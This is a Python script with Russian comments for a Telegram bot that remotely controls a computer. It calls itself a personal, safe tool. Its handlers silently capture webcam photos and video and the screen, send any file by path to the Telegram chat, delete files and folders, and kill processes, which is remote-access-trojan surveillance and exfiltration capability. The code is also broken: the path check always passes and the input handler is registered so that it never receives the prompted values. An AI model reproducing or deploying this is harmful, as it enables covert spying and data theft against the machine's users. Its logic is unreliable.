#!/usr/bin/env python3
# pc_controller_ultimate.py — Полный контроллер ПК со всеми функциями
# Только для вас. Безопасно. macOS-ready.

import os
import sys
import subprocess
import platform
import tempfile
import time
import shutil
import cv2
import numpy as np
from pathlib import Path

# === 🔑 ВАШИ ДАННЫЕ ===
BOT_TOKEN = "ТОКЕН"
AUTHORIZED_USER_ID = АЙДИ

# === АВТОУСТАНОВКА ЗАВИСИМОСТЕЙ ===
try:
    import psutil
    import pyautogui
    from PIL import Image
    from telegram import Update, ReplyKeyboardMarkup
    from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters
except ImportError:
    print("📦 Устанавливаю зависимости...")
    deps = [
        "psutil", "pyautogui", "opencv-python", "Pillow",
        "numpy", "python-telegram-bot==20.7"
    ]
    if platform.system() == "Darwin":
        deps.append("pyobjc-framework-Quartz")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--user"] + deps)
    print("✅ Перезапуск...")
    os.execv(sys.executable, [sys.executable] + sys.argv)

TEMP_DIR = Path(tempfile.gettempdir()) / "tg_pc_control"
TEMP_DIR.mkdir(exist_ok=True)
USER_STATE = {}

# === КЛАВИАТУРЫ ===
def main_menu():
    return ReplyKeyboardMarkup([
        ["📸 Медиа", "📁 Файлы"],
        ["📊 Система", "⚡ Действия"],
        ["🔊 Звук/Обои"]
    ], resize_keyboard=True)

def media_menu():
    return ReplyKeyboardMarkup([
        ["🖼️ Скриншот", "📷 Фото с камеры"],
        ["🎥 Видео с камеры", "🎬 Запись экрана"],
        ["⬅️ Назад"]
    ], resize_keyboard=True)

def files_menu():
    return ReplyKeyboardMarkup([
        ["📤 Отправить файл", "🗑️ Удалить файл"],
        ["📁 Создать папку", "🗑️ Удалить папку"],
        ["🔍 Открыть файл", "⬅️ Назад"]
    ], resize_keyboard=True)

def system_menu():
    return ReplyKeyboardMarkup([
        ["📋 Процессы", "📊 Полный отчёт"],
        ["⏹️ Завершить процесс", "⬅️ Назад"]
    ], resize_keyboard=True)

def actions_menu():
    return ReplyKeyboardMarkup([
        ["💬 Сообщение", "⌨️ Alt+F4"],
        ["🔗 Открыть ссылку", "⬅️ Назад"]
    ], resize_keyboard=True)

def sound_wallpaper_menu():
    return ReplyKeyboardMarkup([
        ["🔊 Звук 100%", "🖼️ Обои"],
        ["⬅️ Назад"]
    ], resize_keyboard=True)

# === ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ===
def is_safe_path(path: str) -> bool:
    try:
        resolved = Path(path).resolve()
        return True
    except:
        return False

def set_volume_max():
    system = platform.system()
    if system == "Darwin":
        subprocess.run(["osascript", "-e", 'set volume output volume 100'])
    elif system == "Windows":
        # Имитация нажатий для увеличения громкости
        for _ in range(50):
            pyautogui.press('volumeup')
    else:
        subprocess.run(["pactl", "set-sink-volume", "@DEFAULT_SINK@", "100%"])

def set_wallpaper(path: str):
    system = platform.system()
    if system == "Darwin":
        script = f'tell application "Finder" to set desktop picture to POSIX file "{path}"'
        subprocess.run(["osascript", "-e", script])
    elif system == "Windows":
        import ctypes
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)

# === ОБРАБОТЧИКИ ===
async def start(update: Update, context):
    if update.effective_user.id != AUTHORIZED_USER_ID:
        return
    # Авто-скриншот при запуске
    try:
        path = TEMP_DIR / "boot.png"
        pyautogui.screenshot().save(path)
        await update.message.reply_photo(photo=open(path, "rb"), caption="✅ Бот запущен!")
        path.unlink()
    except:
        await update.message.reply_text("✅ Бот запущен!")
    await update.message.reply_text("Выберите категорию:", reply_markup=main_menu())

async def handle_button(update: Update, context):
    if update.effective_user.id != AUTHORIZED_USER_ID:
        return
    text = update.message.text

    if text == "📸 Медиа": await update.message.reply_text("Медиа:", reply_markup=media_menu())
    elif text == "📁 Файлы": await update.message.reply_text("Файлы:", reply_markup=files_menu())
    elif text == "📊 Система": await update.message.reply_text("Система:", reply_markup=system_menu())
    elif text == "⚡ Действия": await update.message.reply_text("Действия:", reply_markup=actions_menu())
    elif text == "🔊 Звук/Обои": await update.message.reply_text("Звук и обои:", reply_markup=sound_wallpaper_menu())
    elif text == "⬅️ Назад": await update.message.reply_text("Главное меню:", reply_markup=main_menu())

    # === МЕДИА ===
    elif text == "🖼️ Скриншот":
        path = TEMP_DIR / "screen.png"
        pyautogui.screenshot().save(path)
        await update.message.reply_photo(photo=open(path, "rb"))
        path.unlink()
        await update.message.reply_text("⬅️ Назад", reply_markup=main_menu())

    elif text == "📷 Фото с камеры":
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        if ret:
            path = TEMP_DIR / "cam.jpg"
            cv2.imwrite(str(path), frame)
            await update.message.reply_photo(photo=open(path, "rb"))
            path.unlink()
        else:
            await update.message.reply_text("❌ Камера не отвечает.")
        await update.message.reply_text("⬅️ Назад", reply_markup=main_menu())

    elif text == "🎥 Видео с камеры":
        cap = cv2.VideoCapture(0)
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        path = TEMP_DIR / "cam.mp4"
        out = cv2.VideoWriter(str(path), fourcc, 20.0, (640, 480))
        start = time.time()
        while time.time() - start < 5:
            ret, frame = cap.read()
            if ret: out.write(cv2.resize(frame, (640, 480)))
        cap.release(); out.release()
        await update.message.reply_video(video=open(path, "rb"))
        path.unlink()
        await update.message.reply_text("⬅️ Назад", reply_markup=main_menu())

    elif text == "🎬 Запись экрана":
        path = TEMP_DIR / "screen_rec.mp4"
        screen_size = pyautogui.size()
        fourcc = cv2.VideoWriter_fourcc(*"mp4v")
        out = cv2.VideoWriter(str(path), fourcc, 10.0, screen_size)
        start = time.time()
        while time.time() - start < 10:
            img = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            out.write(frame)
            time.sleep(0.1)
        out.release()
        await update.message.reply_video(video=open(path, "rb"))
        path.unlink()
        await update.message.reply_text("⬅️ Назад", reply_markup=main_menu())

    # === ФАЙЛЫ ===
    elif text == "📤 Отправить файл":
        USER_STATE[update.effective_user.id] = "upload"
        await update.message.reply_text("Введите путь к файлу:")
    elif text == "🗑️ Удалить файл":
        USER_STATE[update.effective_user.id] = "delete_file"
        await update.message.reply_text("Введите путь к файлу:")
    elif text == "📁 Создать папку":
        USER_STATE[update.effective_user.id] = "mkdir"
        await update.message.reply_text("Введите путь папки:")
    elif text == "🗑️ Удалить папку":
        USER_STATE[update.effective_user.id] = "rmdir"
        await update.message.reply_text("Введите путь папки:")
    elif text == "🔍 Открыть файл":
        USER_STATE[update.effective_user.id] = "open_file"
        await update.message.reply_text("Введите путь к файлу:")

    # === СИСТЕМА ===
    elif text == "📋 Процессы":
        procs = [f"{p.info['pid']} | {p.info['name']}" for p in psutil.process_iter(['pid', 'name'])][:20]
        await update.message.reply_text("Процессы:\n" + "\n".join(procs))
        await update.message.reply_text("⬅️ Назад", reply_markup=main_menu())
    elif text == "📊 Полный отчёт":
        lines = []
        for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_info']):
            try:
                mem_mb = round(p.info['memory_info'].rss / 1024 / 1024, 1)
                lines.append(f"{p.info['pid']:>6} | {p.info['name']:<20} | CPU: {p.info['cpu_percent']:>4}% | RAM: {mem_mb:>6} MB")
            except: pass
        await update.message.reply_text("```\n" + "\n".join(lines[:30]) + "\n```", parse_mode="Markdown")
        await update.message.reply_text("⬅️ Назад", reply_markup=main_menu())
    elif text == "⏹️ Завершить процесс":
        USER_STATE[update.effective_user.id] = "kill"
        await update.message.reply_text("Введите PID процесса:")

    # === ДЕЙСТВИЯ ===
    elif text == "💬 Сообщение":
        USER_STATE[update.effective_user.id] = "alert"
        await update.message.reply_text("Введите текст сообщения:")
    elif text == "⌨️ Alt+F4":
        pyautogui.hotkey('alt', 'f4')
        await update.message.reply_text("✅ Alt+F4 отправлено.")
        await update.message.reply_text("⬅️ Назад", reply_markup=main_menu())
    elif text == "🔗 Открыть ссылку":
        USER_STATE[update.effective_user.id] = "open_url"
        await update.message.reply_text("Введите URL:")

    # === ЗВУК / ОБОИ ===
    elif text == "🔊 Звук 100%":
        set_volume_max()
        await update.message.reply_text("✅ Громкость на максимуме.")
        await update.message.reply_text("⬅️ Назад", reply_markup=main_menu())
    elif text == "🖼️ Обои":
        USER_STATE[update.effective_user.id] = "wallpaper"
        await update.message.reply_text("Введите путь к изображению (.jpg/.png):")

    else:
        await update.message.reply_text("Используйте кнопки.", reply_markup=main_menu())

# === ОБРАБОТКА ВВОДА ===
async def handle_input(update: Update, context):
    if update.effective_user.id != AUTHORIZED_USER_ID:
        return
    user_id = update.effective_user.id
    text = update.message.text.strip()
    state = USER_STATE.get(user_id)

    try:
        if state == "upload":
            if is_safe_path(text) and Path(text).is_file():
                await update.message.reply_document(document=open(text, "rb"))
            else:
                await update.message.reply_text("❌ Файл не найден.")
        elif state == "delete_file":
            if is_safe_path(text) and Path(text).is_file():
                Path(text).unlink()
                await update.message.reply_text("✅ Файл удалён.")
            else:
                await update.message.reply_text("❌ Файл не найден.")
        elif state == "mkdir":
            Path(text).mkdir(parents=True, exist_ok=True)
            await update.message.reply_text(f"✅ Папка создана:\n{text}")
        elif state == "rmdir":
            shutil.rmtree(text)
            await update.message.reply_text(f"✅ Папка удалена:\n{text}")
        elif state == "open_file":
            if is_safe_path(text) and Path(text).exists():
                system = platform.system()
                if system == "Darwin": subprocess.run(["open", text])
                elif system == "Windows": os.startfile(text)
                else: subprocess.run(["xdg-open", text])
                await update.message.reply_text("✅ Файл открыт.")
            else:
                await update.message.reply_text("❌ Файл не найден.")
        elif state == "kill":
            pid = int(text)
            psutil.Process(pid).terminate()
            await update.message.reply_text(f"✅ Процесс {pid} завершён.")
        elif state == "alert":
            system = platform.system()
            if system == "Darwin":
                subprocess.run(["osascript", "-e", f'display notification "{text}" with title "Сообщение"'])
            elif system == "Windows":
                subprocess.run(["msg", "*", text])
            else:
                subprocess.run(["notify-send", "Сообщение", text])
            await update.message.reply_text("✅ Сообщение показано.")
        elif state == "open_url":
            url = text if text.startswith(("http://", "https://")) else "https://" + text
            system = platform.system()
            if system == "Darwin": subprocess.run(["open", url])
            elif system == "Windows": os.startfile(url)
            else: subprocess.run(["xdg-open", url])
            await update.message.reply_text(f"✅ Ссылка открыта:\n{url}")
        elif state == "wallpaper":
            if is_safe_path(text) and Path(text).exists():
                set_wallpaper(text)
                await update.message.reply_text("✅ Обои изменены.")
            else:
                await update.message.reply_text("❌ Изображение не найдено.")

    except Exception as e:
        await update.message.reply_text(f"❌ Ошибка: {e}")
    
    USER_STATE.pop(user_id, None)
    await update.message.reply_text("⬅️ Назад", reply_markup=main_menu())

# === ЗАПУСК ===
if __name__ == "__main__":
    print("🟢 Запуск Ultimate PC Controller...")
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_button))
    app.add_handler(MessageHandler(filters.TEXT & filters.COMMAND, handle_input))
    app.run_polling()
